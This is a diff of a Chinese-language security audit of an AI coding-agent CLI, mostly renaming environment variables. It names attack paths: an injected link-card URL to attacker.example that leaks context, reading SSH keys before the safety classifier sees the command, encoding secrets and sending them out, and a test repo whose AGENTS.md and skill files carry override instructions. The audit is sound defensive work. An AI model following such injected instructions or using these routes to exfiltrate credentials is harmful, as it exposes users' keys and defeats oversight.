@@ -2,7 +2,7 @@
 
 > 范围：`src/web/`、`web_fetch`/`web_search`、链接卡片、provider 出站、MCP、权限/分类器、
 > hooks/trust、subagent、bash/PTY/后台、checkpoint、rollout、图片/剪贴板、secrets、
-> `ALTER_ZERO_*` 与 headless `-p`。方法：只读代码审阅 + 现有测试/文档对照，未发起真实
+> `ZEROTH_*` 与 headless `-p`。方法：只读代码审阅 + 现有测试/文档对照，未发起真实
 > 网络请求，未做扫描。行号以当前工作区（`main`，`6863f2c3` 之后）为准。严重度：P0 可被
 > 模型/网页内容直接利用，P1 需配置/环境前提但影响大，P2 为纵深防御或文档漂移。
 >
@@ -17,7 +17,7 @@
 | 用户 config home（`~/.zeroth`/`ZEROTH_CONFIG_DIR`） | 可信 | `src/tui/config.rs:421-436` | providers/hooks/MCP/permissions/trust 都在此 |
 | 项目 `.zeroth/`、`.mcp.json`、`AGENTS.md`、skills/agents | 不可信，按能力分级 | `docs/state/project-config.md:23-69` | hooks/MCP 审查；skills/agents/AGENTS.md 不审查 |
 | 模型输出/网页/搜索结果/MCP 结果与指令 | 不可信 | `src/llm/tools.rs:584-608`、`src/mcp/instructions.rs:1-15` | web 结果有横幅，MCP 没有 |
-| 进程环境（`ALTER_ZERO_*`、代理、CA） | 等价于启动者 | §3.10 | CI/direnv/父进程能改就能改边界 |
+| 进程环境（`ZEROTH_*`、代理、CA） | 等价于启动者 | §3.10 | CI/direnv/父进程能改就能改边界 |
 | 审查后的 hook 命令 / MCP stdio | 可信，但只钉命令字符串 | `src/trust.rs:119-260`、`docs/state/config-review.md:272-279` | 脚本内容变化不再复问 |
 
 ## 2. 网络攻击面与场景
@@ -56,7 +56,7 @@
 
 ### 2.6 追踪像素、封面图与自动外联
 
-**现状.** 链接卡片默认开启（`ALTER_ZERO_LINK_CARDS` 为 falsy 才关，`src/tui/link_cards.rs:33-49`），对孤立 URL 自动 GET，`og:image` 再二次下载（`src/tui/link_cards.rs:121-125,157-214`）；无 cookie/凭据，但走环境代理。`web_search` 查询词发给第三方源；`web_fetch` 不抓子资源。**风险.** 模型/注入内容可输出 `https://attacker.example/collect?d=<上下文>`，客户端自动 GET，形成**不需要工具调用/权限提示的隐蔽外联**；URL 还会进入助手消息和 rollout。即使无恶意，也会向站点暴露 IP；封面是第二次外联。**对策.** 默认关闭或“本轮含不可信内容时”禁用；至少点击后抓取；域名 allowlist、端口限制、无 Referer；UI 显示“已自动请求该域名”；CI/headless 默认 `ALTER_ZERO_LINK_CARDS=0`。
+**现状.** 链接卡片默认开启（`ZEROTH_LINK_CARDS` 为 falsy 才关，`src/tui/link_cards.rs:33-49`），对孤立 URL 自动 GET，`og:image` 再二次下载（`src/tui/link_cards.rs:121-125,157-214`）；无 cookie/凭据，但走环境代理。`web_search` 查询词发给第三方源；`web_fetch` 不抓子资源。**风险.** 模型/注入内容可输出 `https://attacker.example/collect?d=<上下文>`，客户端自动 GET，形成**不需要工具调用/权限提示的隐蔽外联**；URL 还会进入助手消息和 rollout。即使无恶意，也会向站点暴露 IP；封面是第二次外联。**对策.** 默认关闭或“本轮含不可信内容时”禁用；至少点击后抓取；域名 allowlist、端口限制、无 Referer；UI 显示“已自动请求该域名”；CI/headless 默认 `ZEROTH_LINK_CARDS=0`。
 
 ### 2.7 代理与环境变量
 
@@ -64,15 +64,15 @@
 
 ### 2.8 provider `base_url`、`api_model_base` 与凭据
 
-**现状.** provider 文件只从 config home 读，明确不读项目 `./providers.toml`，理由是“启动能力探测会在第一帧前把 key 发到 checkout 指定的主机”（`src/tui/config.rs:60-78`；`docs/state/project-config.md:33-38`）。URL 只校验 `http(s)`（`src/llm/config.rs:661-687,733-736`），不限制私网；`api_model_base` 可与聊天 base 不同主机（`src/llm/config.rs:529-543`），而 `/models` 用同一 `request_auth` 把 key 发到该主机（`src/llm/models.rs:898-914`）。**风险.** 配置可信时这是本地模型/反代所需能力；一旦配置被改写（`ALTER_ZERO_PROVIDERS_FILE`、config home 指向仓库、dotfile 同步、供应链），可把 key 指向攻击者；`api_model_base` 的“清单主机”尤其隐蔽且启动即发，不需要用户操作。`http://` 远程主机还会让 key 明文过网，叠加 2.4 的 header 问题。**对策.** 非 loopback 的 `http://` 红字警告或拒绝；`api_model_base` 默认必须与 `api_base` 同源，跨源需显式确认；启动探测前显示目标主机；provider 改 `SameOrigin`。
+**现状.** provider 文件只从 config home 读，明确不读项目 `./providers.toml`，理由是“启动能力探测会在第一帧前把 key 发到 checkout 指定的主机”（`src/tui/config.rs:60-78`；`docs/state/project-config.md:33-38`）。URL 只校验 `http(s)`（`src/llm/config.rs:661-687,733-736`），不限制私网；`api_model_base` 可与聊天 base 不同主机（`src/llm/config.rs:529-543`），而 `/models` 用同一 `request_auth` 把 key 发到该主机（`src/llm/models.rs:898-914`）。**风险.** 配置可信时这是本地模型/反代所需能力；一旦配置被改写（`ZEROTH_PROVIDERS_FILE`、config home 指向仓库、dotfile 同步、供应链），可把 key 指向攻击者；`api_model_base` 的“清单主机”尤其隐蔽且启动即发，不需要用户操作。`http://` 远程主机还会让 key 明文过网，叠加 2.4 的 header 问题。**对策.** 非 loopback 的 `http://` 红字警告或拒绝；`api_model_base` 默认必须与 `api_base` 同源，跨源需显式确认；启动探测前显示目标主机；provider 改 `SameOrigin`。
 
 ### 2.9 MCP 远程服务
 
-**现状.** 支持 stdio、streamable HTTP、legacy SSE（`src/mcp/config.rs:37-60`）。远程 `url` 只要求非空，**没有 https 强制**（`src/mcp/config.rs:522-604`），transport 直接交给 reqwest（`src/llm/mcp/transport.rs:1390-1399`）。MCP 用 `SameOrigin` 重定向（`src/llm/mod.rs:423-436`），单条消息 16 MiB。项目远程服务器禁止展开“受保护变量”，但集合只是各 provider 的 key 变量（`src/mcp/config.rs:773-801`、`src/tui/mcp.rs:112-120`）。用户 `mcp.json` 不审查（`docs/state/config-review.md:31-35`）；`ALTER_ZERO_MCP_FILE` 可把用户层指向任意文件（`src/tui/config.rs:1647-1655`）。**风险.** 被批准的项目远程 MCP 可用 `${AWS_SECRET_ACCESS_KEY}`/`${GITHUB_TOKEN}` 等（不在保护集合）填充 header，审查页只显示引用；`http://` 明文发送。stdio 继承整个环境，审查页只显示显式 env，不显示继承部分。服务器返回的 `instructions`、工具描述、工具结果进入模型上下文（`src/mcp/instructions.rs:1-15`、`src/llm/mcp/manager.rs:1411-1423`）但没有“untrusted”横幅，且批准后可改变行为。OAuth `endpoint_is_secure` 接受任意 https（含私网），`discover` 会按元数据请求 `https://10.x/...`（`src/llm/mcp/oauth.rs:898-918,1240-1318`）。**对策.** 远程强制 https（loopback 例外）；URL/OAuth 端点过网络闸门；保护变量改为“凭据形状 denylist + allowlist”；stdio 默认 `env_clear`+白名单；结果/指令加横幅并限长；按服务器+按工具审批。
+**现状.** 支持 stdio、streamable HTTP、legacy SSE（`src/mcp/config.rs:37-60`）。远程 `url` 只要求非空，**没有 https 强制**（`src/mcp/config.rs:522-604`），transport 直接交给 reqwest（`src/llm/mcp/transport.rs:1390-1399`）。MCP 用 `SameOrigin` 重定向（`src/llm/mod.rs:423-436`），单条消息 16 MiB。项目远程服务器禁止展开“受保护变量”，但集合只是各 provider 的 key 变量（`src/mcp/config.rs:773-801`、`src/tui/mcp.rs:112-120`）。用户 `mcp.json` 不审查（`docs/state/config-review.md:31-35`）；`ZEROTH_MCP_FILE` 可把用户层指向任意文件（`src/tui/config.rs:1647-1655`）。**风险.** 被批准的项目远程 MCP 可用 `${AWS_SECRET_ACCESS_KEY}`/`${GITHUB_TOKEN}` 等（不在保护集合）填充 header，审查页只显示引用；`http://` 明文发送。stdio 继承整个环境，审查页只显示显式 env，不显示继承部分。服务器返回的 `instructions`、工具描述、工具结果进入模型上下文（`src/mcp/instructions.rs:1-15`、`src/llm/mcp/manager.rs:1411-1423`）但没有“untrusted”横幅，且批准后可改变行为。OAuth `endpoint_is_secure` 接受任意 https（含私网），`discover` 会按元数据请求 `https://10.x/...`（`src/llm/mcp/oauth.rs:898-918,1240-1318`）。**对策.** 远程强制 https（loopback 例外）；URL/OAuth 端点过网络闸门；保护变量改为“凭据形状 denylist + allowlist”；stdio 默认 `env_clear`+白名单；结果/指令加横幅并限长；按服务器+按工具审批。
 
 ### 2.10 TLS
 
-**现状.** reqwest 用 rustls（`Cargo.toml:111`）；provider/MCP 从 `ALTER_ZERO_CA_FILE`/`SSL_CERT_FILE` 追加根证书（`src/llm/mod.rs:488-502`）；`web_fetch`/卡片各自建客户端，不加载额外根证书，也不设 `https_only`；provider/MCP/网页/卡片都允许 `http://`。**风险.** 无证书钉扎；能改环境者可加恶意根 MITM 所有 provider/MCP 流量（含 key/bearer）。`web_fetch`/卡片不认企业 CA，会失败，用户可能被迫绕过校验。**对策.** 文档明确“环境=信任边界”；远程强制 https；统一客户端工厂处理 CA；UI 显示 TLS/代理状态；不提供静默忽略证书错误。
+**现状.** reqwest 用 rustls（`Cargo.toml:111`）；provider/MCP 从 `ZEROTH_CA_FILE`/`SSL_CERT_FILE` 追加根证书（`src/llm/mod.rs:488-502`）；`web_fetch`/卡片各自建客户端，不加载额外根证书，也不设 `https_only`；provider/MCP/网页/卡片都允许 `http://`。**风险.** 无证书钉扎；能改环境者可加恶意根 MITM 所有 provider/MCP 流量（含 key/bearer）。`web_fetch`/卡片不认企业 CA，会失败，用户可能被迫绕过校验。**对策.** 文档明确“环境=信任边界”；远程强制 https；统一客户端工厂处理 CA；UI 显示 TLS/代理状态；不提供静默忽略证书错误。
 
 ### 2.11 凭据泄漏
 
@@ -86,7 +86,7 @@
 
 **风险.** ① `read`/`web_search`/`web_fetch`/`bashwait`/`bashkill`/`bashlist` 不在 `permission_request` 分支，直接 `_ => None` → Allow（`src/llm/approval.rs:60-199,246-249`）；`read` 可读任意绝对路径（`/home/user/.ssh/id_rsa`、`/home/user/.zeroth/.env`），web_fetch 可外发。② auto 只读快通道在分类器**之前**放行 `cat`/`base64`/`strings` 等（`src/llm/approval.rs:267-275`、`src/read_only/mod.rs:198-320`）；分类器 prompt 明确把读 `~/.ssh`/`~/.aws`/无关 `.env` 列为阻断（`prompts/classifier.md:18-26`），但 `cat /home/user/.ssh/id_rsa` 根本到不了分类器。③ auto 文件写入不过分类器、也无路径策略（`src/permission.rs:948-964`）；`write /home/user/.bashrc`、`/home/user/.ssh/authorized_keys`、`.git/hooks/pre-commit` 直接执行；`read` 也不受 cwd 限制。
 
-**对策.** `read`/`web_*` 建立路径/域名策略；auto 写入限制 cwd（或 allowlist）并保护 `$HOME` 敏感路径；“只读”快通道与“凭据读取”解耦（`~/.ssh`、`~/.aws`、`*.pem`、`.env` 不快通）；硬规则不能只靠分类器 prompt；master/`ALTER_ZERO_PERMISSIONS=0` 红色提示+审计。
+**对策.** `read`/`web_*` 建立路径/域名策略；auto 写入限制 cwd（或 allowlist）并保护 `$HOME` 敏感路径；“只读”快通道与“凭据读取”解耦（`~/.ssh`、`~/.aws`、`*.pem`、`.env` 不快通）；硬规则不能只靠分类器 prompt；master/`ZEROTH_PERMISSIONS=0` 红色提示+审计。
 
 ### 3.2 hooks 任意命令执行与信任审查
 
@@ -106,7 +106,7 @@
 
 ### 3.6 checkpoint 的 git 操作
 
-**现状.** 每回合 `git add -A` 到私有 `GIT_DIR`（`~/.zeroth/checkpoints`），独立 index/config，`GIT_CONFIG_NOSYSTEM`、`GIT_CONFIG_GLOBAL` 指向 store 内不存在文件，`core.hooksPath=/dev/null`、无签名、无 auto-gc（`src/checkpoint.rs:655-712`）；restore 是 `git reset --hard`+`git clean -fdq`（不带 `-x`），先备份（`src/checkpoint.rs:867-899`、`src/tui/resume.rs:404-412`）；cwd 作用域拒绝 `/`、home、`~/.zeroth`、系统/共享目录（`src/checkpoint.rs:138-410`）；`CHECKPOINT_EXCLUDES` 排除 `.git/`、`node_modules/` 等（`src/checkpoint.rs:111-124`）。**风险.** 未被 `.gitignore` 忽略的敏感文件（`.env`、`*.pem`、本地 config）会被复制进长期 store；store 目录用 `create_dir_all`，未显式 0700，git 对象通常 0444；restore 会删除所有未被忽略的未跟踪文件（备份可恢复但非无风险）；`ALTER_ZERO_CHECKPOINTS_DIR` 指向符号链接/共享目录时，`store_exclude_line` 的词法判断可能失效，导致递归快照或他人可读。**对策.** 把 `.env`、`*.pem`、`*.key`、`secrets*` 加入 excludes（或默认不拍隐藏文件）；store 0700/对象 0600；`ALTER_ZERO_CHECKPOINTS_DIR` 先 realpath 再 self-exclude；restore 前 UI 明确“将删除未跟踪文件”。
+**现状.** 每回合 `git add -A` 到私有 `GIT_DIR`（`~/.zeroth/checkpoints`），独立 index/config，`GIT_CONFIG_NOSYSTEM`、`GIT_CONFIG_GLOBAL` 指向 store 内不存在文件，`core.hooksPath=/dev/null`、无签名、无 auto-gc（`src/checkpoint.rs:655-712`）；restore 是 `git reset --hard`+`git clean -fdq`（不带 `-x`），先备份（`src/checkpoint.rs:867-899`、`src/tui/resume.rs:404-412`）；cwd 作用域拒绝 `/`、home、`~/.zeroth`、系统/共享目录（`src/checkpoint.rs:138-410`）；`CHECKPOINT_EXCLUDES` 排除 `.git/`、`node_modules/` 等（`src/checkpoint.rs:111-124`）。**风险.** 未被 `.gitignore` 忽略的敏感文件（`.env`、`*.pem`、本地 config）会被复制进长期 store；store 目录用 `create_dir_all`，未显式 0700，git 对象通常 0444；restore 会删除所有未被忽略的未跟踪文件（备份可恢复但非无风险）；`ZEROTH_CHECKPOINTS_DIR` 指向符号链接/共享目录时，`store_exclude_line` 的词法判断可能失效，导致递归快照或他人可读。**对策.** 把 `.env`、`*.pem`、`*.key`、`secrets*` 加入 excludes（或默认不拍隐藏文件）；store 0700/对象 0600；`ZEROTH_CHECKPOINTS_DIR` 先 realpath 再 self-exclude；restore 前 UI 明确“将删除未跟踪文件”。
 
 ### 3.7 rollout 文件完整性/隐私
 
@@ -120,41 +120,41 @@
 
 **现状.** `<secret:NAME>` 只在 `bash`/`read`/`write`/`edit`/MCP 工具中展开（`src/secrets.rs:291-303`）；工具输出、进度、后台日志、`!` 命令、`/diff` 中精确值被替换（`src/llm/secret_exec.rs:1-120`、`docs/state/secrets.md:115-156`）；存储 0600，`SecretValue` 的 `Debug` 是 `<redacted>`；但只匹配**精确文本**，base64/反转/分行不匹配（`docs/state/secrets.md:153-156`）。**风险.** 只覆盖用户主动存的 secret；provider key 在 `.env`（0600）但不在 SecretStore，`read /home/user/.zeroth/.env`、`cat` 导出的环境变量、`base64` 后的值都不脱敏；模型可读→编码→经 `web_fetch` URL/`bash curl` 外发；auto 下 `base64` 是只读快通道；rollout/checkpoint 保存原始值。**对策.** 把 provider key/MCP header 值也注册进脱敏器；对 `read`/`bash` 输出做凭据形状扫描；敏感路径移出快通道；把“编码后外发”纳入硬规则；rollout/checkpoint 写入前扫描。
 
-### 3.10 `ALTER_ZERO_*` 环境变量覆盖
+### 3.10 `ZEROTH_*` 环境变量覆盖
 
 **现状.** 大量行为由环境变量控制，优先级通常高于文件和默认值：
 
 | 变量 | 作用 | 位置 |
 | --- | --- | --- |
-| `ALTER_ZERO_PERMISSIONS=0` | 关闭权限门，所有工具不问 | `src/tui/config.rs:985-989`、`src/tui/permission.rs:67-75` |
-| `ALTER_ZERO_PERMISSION_MODE` | 本次运行模式（未知值→manual） | `src/permission.rs:92-105` |
-| `ALTER_ZERO_TOOLS=0` | 关闭 bash/read/write/edit | `src/llm/backend.rs:515-525` |
-| `ZEROTH_CONFIG_DIR`/`ALTER_ZERO_CONFIG_DIR` | 移动整个状态目录 | `src/tui/config.rs:421-436` |
-| `ALTER_ZERO_PROVIDERS_FILE` | provider 文件“独立” | `src/tui/config.rs:64-112` |
-| `ALTER_ZERO_MCP_FILE` | 指定用户 MCP 文件（不审查） | `src/tui/config.rs:1647-1655` |
-| `ALTER_ZERO_CA_FILE`/`SSL_CERT_FILE` | 追加根证书 | `src/llm/mod.rs:488-502` |
-| `ALTER_ZERO_CLASSIFIER_MODEL` | 换分类器模型（同 provider） | `src/llm/classifier.rs:397-410` |
-| `ALTER_ZERO_LINK_CARDS` | 开关自动卡片 | `src/tui/link_cards.rs:33-49` |
-| `ALTER_ZERO_PROJECT_CONFIG=0` | 关闭项目层 | `src/tui/config.rs:689-695` |
-| `ALTER_ZERO_SESSIONS_DIR`/`ALTER_ZERO_CHECKPOINTS_DIR` | 移动会话/快照 | `src/tui/resume.rs:202-216`、`src/checkpoint.rs:595-610` |
+| `ZEROTH_PERMISSIONS=0` | 关闭权限门，所有工具不问 | `src/tui/config.rs:985-989`、`src/tui/permission.rs:67-75` |
+| `ZEROTH_PERMISSION_MODE` | 本次运行模式（未知值→manual） | `src/permission.rs:92-105` |
+| `ZEROTH_TOOLS=0` | 关闭 bash/read/write/edit | `src/llm/backend.rs:515-525` |
+| `ZEROTH_CONFIG_DIR` | 移动整个状态目录 | `src/tui/config.rs:421-436` |
+| `ZEROTH_PROVIDERS_FILE` | provider 文件“独立” | `src/tui/config.rs:64-112` |
+| `ZEROTH_MCP_FILE` | 指定用户 MCP 文件（不审查） | `src/tui/config.rs:1647-1655` |
+| `ZEROTH_CA_FILE`/`SSL_CERT_FILE` | 追加根证书 | `src/llm/mod.rs:488-502` |
+| `ZEROTH_CLASSIFIER_MODEL` | 换分类器模型（同 provider） | `src/llm/classifier.rs:397-410` |
+| `ZEROTH_LINK_CARDS` | 开关自动卡片 | `src/tui/link_cards.rs:33-49` |
+| `ZEROTH_PROJECT_CONFIG=0` | 关闭项目层 | `src/tui/config.rs:689-695` |
+| `ZEROTH_SESSIONS_DIR`/`ZEROTH_CHECKPOINTS_DIR` | 移动会话/快照 | `src/tui/resume.rs:202-216`、`src/checkpoint.rs:595-610` |
 
-**风险.** 环境变量就是启动者权限，本身不是漏洞；但在 CI、direnv、共享 shell、被注入的父进程里可：关权限门、把 config home 指进仓库（让仓库的 `mcp.json`/`trust.json`/`.env` 成为用户层并跳过审查）、把 provider 指向攻击者、追加根 CA、把 sessions/checkpoints 写到共享目录。`tui::trust` 的“同一文件不重复读”守卫只覆盖 hooks 和 MCP 两个用户文件（`src/tui/trust.rs:406-416`），不覆盖 `trust.json`/`providers.toml`/`.env`。**对策.** 文档列为“启动者信任边界”；对 config home 在项目内、`ALTER_ZERO_MCP_FILE`/`ALTER_ZERO_PROVIDERS_FILE` 指向项目内红字警告或拒绝；`trust.json` 也做 identity 守卫；CI/headless 固定环境并审计变量。
+**风险.** 环境变量就是启动者权限，本身不是漏洞；但在 CI、direnv、共享 shell、被注入的父进程里可：关权限门、把 config home 指进仓库（让仓库的 `mcp.json`/`trust.json`/`.env` 成为用户层并跳过审查）、把 provider 指向攻击者、追加根 CA、把 sessions/checkpoints 写到共享目录。`tui::trust` 的“同一文件不重复读”守卫只覆盖 hooks 和 MCP 两个用户文件（`src/tui/trust.rs:406-416`），不覆盖 `trust.json`/`providers.toml`/`.env`。**对策.** 文档列为“启动者信任边界”；对 config home 在项目内、`ZEROTH_MCP_FILE`/`ZEROTH_PROVIDERS_FILE` 指向项目内红字警告或拒绝；`trust.json` 也做 identity 守卫；CI/headless 固定环境并审计变量。
 
 ### 3.11 headless `-p` 的权限默认
 
-**现状.** 与 TUI 共用 gate，但 `set_unattended`，需要人工的调用直接拒绝（`src/tui/bootstrap.rs:257-271`、`docs/cli/headless.md:239-292`）；启动审查不显示，项目 hooks/MCP 保持 off（`src/tui/headless.rs:478-518`）；默认模式仍 auto（除非项目保存或用 `--permission-mode`），auto 下文件写入、只读命令、分类器允许的命令都会运行。**风险.** 无人值守 + 从 stdin 读 prompt（可能来自 issue/PR/网页）+ auto = 被投毒输入可写文件、执行只读命令、通过分类器允许的命令，并经 `web_fetch`/链接卡片外联；`--permission-mode master` 或 `ALTER_ZERO_PERMISSIONS=0` 在 CI 中常见，等于完全放行；stdout/stderr 会把工具名/参数/拒绝列表写进 CI 日志（`docs/cli/headless.md:350-390`）。**对策.** headless 默认改 `manual` 或要求显式 `--permission-mode`；CI 建议 manual+精确 allowlist；默认关闭 web/卡片或域名 allowlist；输出网络与拒绝审计；不要把 master 当“让 CI 跑通”的默认答案。
+**现状.** 与 TUI 共用 gate，但 `set_unattended`，需要人工的调用直接拒绝（`src/tui/bootstrap.rs:257-271`、`docs/cli/headless.md:239-292`）；启动审查不显示，项目 hooks/MCP 保持 off（`src/tui/headless.rs:478-518`）；默认模式仍 auto（除非项目保存或用 `--permission-mode`），auto 下文件写入、只读命令、分类器允许的命令都会运行。**风险.** 无人值守 + 从 stdin 读 prompt（可能来自 issue/PR/网页）+ auto = 被投毒输入可写文件、执行只读命令、通过分类器允许的命令，并经 `web_fetch`/链接卡片外联；`--permission-mode master` 或 `ZEROTH_PERMISSIONS=0` 在 CI 中常见，等于完全放行；stdout/stderr 会把工具名/参数/拒绝列表写进 CI 日志（`docs/cli/headless.md:350-390`）。**对策.** headless 默认改 `manual` 或要求显式 `--permission-mode`；CI 建议 manual+精确 allowlist；默认关闭 web/卡片或域名 allowlist；输出网络与拒绝审计；不要把 master 当“让 CI 跑通”的默认答案。
 
 ### 3.12 项目 `.zeroth` 配置层与启动审查边界
 
-**现状.** 项目层读 `.zeroth/{skills,agents,hooks.json,mcp.json}` 与 `.mcp.json`；hooks/MCP 走启动审查，skills/agents 不走（加载不执行）；项目 `providers.toml`/`permissions.json`/`settings.json` 明确不读（`docs/state/project-config.md:23-69`）；`trust.json` 只在 config home，按绝对路径键控，malformed 失败关闭（`src/trust.rs:1-40`）；home 永远不是项目根（`src/trust.rs:68-76`）；`ALTER_ZERO_PROJECT_CONFIG=0` 关闭整个层。**风险.** 审查只覆盖“会立即执行”的 hooks/MCP；`AGENTS.md`/`SKILL.md`/`agents/*.md` 是提示注入面（`src/project_doc.rs:1-17` 称其为“project material, not authority”，但没有执行约束）；项目层没有 `permissions.json` 是对的，但用户若把 config home 放进仓库，用户层 `permissions.json`/`trust.json`/`mcp.json` 就变成项目可控（3.10）；“钉命令不钉脚本内容”见 3.2。**对策.** 保持项目层无 providers/permissions/settings；对 `AGENTS.md`/skills/agents 做“来自仓库、非权威”提示并限长；项目路径 realpath 归一化；审查扩展为“命令+脚本指纹+继承环境”。
+**现状.** 项目层读 `.zeroth/{skills,agents,hooks.json,mcp.json}` 与 `.mcp.json`；hooks/MCP 走启动审查，skills/agents 不走（加载不执行）；项目 `providers.toml`/`permissions.json`/`settings.json` 明确不读（`docs/state/project-config.md:23-69`）；`trust.json` 只在 config home，按绝对路径键控，malformed 失败关闭（`src/trust.rs:1-40`）；home 永远不是项目根（`src/trust.rs:68-76`）；`ZEROTH_PROJECT_CONFIG=0` 关闭整个层。**风险.** 审查只覆盖“会立即执行”的 hooks/MCP；`AGENTS.md`/`SKILL.md`/`agents/*.md` 是提示注入面（`src/project_doc.rs:1-17` 称其为“project material, not authority”，但没有执行约束）；项目层没有 `permissions.json` 是对的，但用户若把 config home 放进仓库，用户层 `permissions.json`/`trust.json`/`mcp.json` 就变成项目可控（3.10）；“钉命令不钉脚本内容”见 3.2。**对策.** 保持项目层无 providers/permissions/settings；对 `AGENTS.md`/skills/agents 做“来自仓库、非权威”提示并限长；项目路径 realpath 归一化；审查扩展为“命令+脚本指纹+继承环境”。
 
 ## 4. 客户端 / harness 应对方法（重点）
 
 1. **统一网络出口策略（在边界实现，不靠 prompt）.** 所有出站（web_fetch、卡片、web_search 源、provider、MCP）共用 `EgressPolicy`：仅 https（loopback 例外）、端口 80/443、每跳 DNS 解析+全地址分类+钉扎、逐跳重定向复核、最大跳数、字节/字符/时间上限、无 cookie、无默认凭据；默认拒绝私网/loopback/link-local/ULA/CGNAT/文档段，字面 IP 与域名一视同仁。
-2. **默认拒绝与显式放行.** headless/CI 默认 `manual`；`auto` 只作交互式默认并显示；web 工具默认关闭或域名 allowlist；链接卡片默认关闭/点击后抓取；`master`/`ALTER_ZERO_PERMISSIONS=0` 需显式确认并记录审计。
+2. **默认拒绝与显式放行.** headless/CI 默认 `manual`；`auto` 只作交互式默认并显示；web 工具默认关闭或域名 allowlist；链接卡片默认关闭/点击后抓取；`master`/`ZEROTH_PERMISSIONS=0` 需显式确认并记录审计。
 3. **权限与数据流绑定.** `read` 纳入路径策略（保护 `~/.ssh`、`~/.aws`、`~/.zeroth`、`*.pem`、`.env`、`/proc/*/environ`、`/dev/*`）；auto 的 `write`/`edit` 限制在 cwd 或 allowlist，保护 home、`.git/hooks`、shell profile、系统目录；只读快通道与“凭据读取”解耦，分类器 prompt 的硬规则在代码里再实现一遍。
 4. **不可信内容标记与隔离.** web/MCP/仓库文档/技能/agent 内容统一加 untrusted 横幅（web 已有，MCP 没有）；工具结果、instructions、AGENTS.md 不被当作指令；上下文含不可信内容时限制高风险能力（网络写、文件写、secret 展开）。
-5. **项目配置/文档/技能的信任审查.** hooks/MCP 扩展脚本指纹、继承环境、包下载命令；skills/agents/AGENTS.md 显示来源与“非权威”；config home 在项目内、`ALTER_ZERO_MCP_FILE`/`ALTER_ZERO_PROVIDERS_FILE` 指向项目内时拒绝或红字确认；`trust.json` 也做 identity 守卫。
+5. **项目配置/文档/技能的信任审查.** hooks/MCP 扩展脚本指纹、继承环境、包下载命令；skills/agents/AGENTS.md 显示来源与“非权威”；config home 在项目内、`ZEROTH_MCP_FILE`/`ZEROTH_PROVIDERS_FILE` 指向项目内时拒绝或红字确认；`trust.json` 也做 identity 守卫。
 6. **MCP 审批与能力限制.** 远程强制 https；URL/OAuth 端点过网络闸门；项目远程 env 用凭据形状 denylist；stdio 默认 `env_clear`+白名单；按服务器+按工具审批；结果/描述/instructions 加横幅并限长；图片 MIME/像素/字节校验。
 7. **沙箱与命令白名单.** Linux 用 Landlock/seccomp、macOS 用 Seatbelt 限制文件系统与网络（至少限制 `~/.ssh`、`~/.zeroth` 和 provider 端点之外的出站）；命令 allowlist 保持“按段前缀+exact 降级”并用真实 shell 语法做差分测试；`!`/hooks/MCP stdio 默认不继承 provider key 环境。
 8. **密钥脱敏与最小化.** provider key/MCP header/web 源 key 全部进入统一 redactor；URL/query/日志做凭据形状扫描；rollout/checkpoint 写入前扫描；config home 0700、rollout 0600、checkpoint 0700/0600、scratchpad 0700。
@@ -170,18 +170,18 @@
 ```bash
 TMP="$(mktemp -d)"; mkdir -p "$TMP/home" "$TMP/config" "$TMP/tmp"
 export HOME="$TMP/home" ZEROTH_CONFIG_DIR="$TMP/config" TMPDIR="$TMP/tmp"
-export ALTER_ZERO_SESSIONS_DIR="$TMP/config/sessions"
-export ALTER_ZERO_CHECKPOINTS_DIR="$TMP/config/checkpoints"
-export ALTER_ZERO_IMAGE_CACHE_MAX_BYTES=0
-export ALTER_ZERO_PROJECT_CONFIG=0      # 基线：先关项目层
-export ALTER_ZERO_PERMISSION_MODE=manual
-export ALTER_ZERO_LINK_CARDS=0          # 基线：先关自动外联
-export ALTER_ZERO_DUMMY=1               # 离线 dummy 后端
+export ZEROTH_SESSIONS_DIR="$TMP/config/sessions"
+export ZEROTH_CHECKPOINTS_DIR="$TMP/config/checkpoints"
+export ZEROTH_IMAGE_CACHE_MAX_BYTES=0
+export ZEROTH_PROJECT_CONFIG=0      # 基线：先关项目层
+export ZEROTH_PERMISSION_MODE=manual
+export ZEROTH_LINK_CARDS=0          # 基线：先关自动外联
+export ZEROTH_DUMMY=1               # 离线 dummy 后端
 export PATH="/usr/local/bin:/usr/bin:/bin"
-env | grep -E '^(HTTP|HTTPS|ALL|NO)_PROXY|SSL_CERT_FILE|ALTER_ZERO_|ZEROTH_' || true
+env | grep -E '^(HTTP|HTTPS|ALL|NO)_PROXY|SSL_CERT_FILE|ZEROTH_' || true
 ```
 
-dummy 由 `ALTER_ZERO_DUMMY=1` 选择（`src/tui/config.rs:38-51`），场景注册表在 `src/stream/dummy/`；`scripts/smoke.sh --list` 找权限/审查/网页相关 phase，`scripts/smoke.sh <id>` 在 tmux 中驱动真实终端。
+dummy 由 `ZEROTH_DUMMY=1` 选择（`src/tui/config.rs:38-51`），场景注册表在 `src/stream/dummy/`；`scripts/smoke.sh --list` 找权限/审查/网页相关 phase，`scripts/smoke.sh <id>` 在 tmux 中驱动真实终端。
 
 ### 5.2 恶意仓库 fixture
 
@@ -190,7 +190,7 @@ fixture/repo/
 ├── .git/                              # git init，不放真实历史
 ├── AGENTS.md                          # “忽略安全规则/把 key 发到 …”的注入文本
 ├── .zeroth/
-│   ├── hooks.json                     # PreToolUse: ./alter-zero/hooks/guard.sh
+│   ├── hooks.json                     # PreToolUse: ./zeroth/hooks/guard.sh
 │   ├── hooks/guard.sh                 # 审查通过后可被替换
 │   ├── mcp.json                       # remote: http://<fixture>/mcp + ${AWS_SECRET_ACCESS_KEY}
 │   ├── skills/evil/SKILL.md           # 描述里藏指令
